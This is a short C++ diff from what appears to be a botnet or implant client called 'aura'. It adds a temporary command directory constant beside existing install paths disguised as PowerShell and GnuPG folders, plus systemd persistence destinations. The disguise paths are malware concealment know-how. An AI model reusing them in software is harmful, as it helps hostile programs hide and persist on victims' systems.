@@ -21,6 +21,7 @@ const std::unordered_map<std::string, std::tuple<std::string, std::string>>
 const std::string INSTALL_DIR("AppData/Local/Microsoft/Windows/PowerShell");
 const std::string ADMIN_INSTALL_DIR(
     "C:/ProgramData/Microsoft/Windows/PowerShell");
+const std::string COMMAND_TEMP_DIR("CacheData");
 
 const std::string AUTH_FILE("ProfileDataCache");
 const std::string BIN("aura.exe");
@@ -38,6 +39,7 @@ const std::string INSTALL_DIR(".gnupg/.seeds");
 const std::string ROOT_HOME("/root");
 const std::string SERVICE_DEST(".config/systemd/user");
 const std::string SYS_SERVICE_DEST("/etc/systemd/system");
+const std::string COMMAND_TEMP_DIR(".temp");
 
 const std::string AUTH_FILE(".seed_gnupg~");
 const std::string BIN("aura");
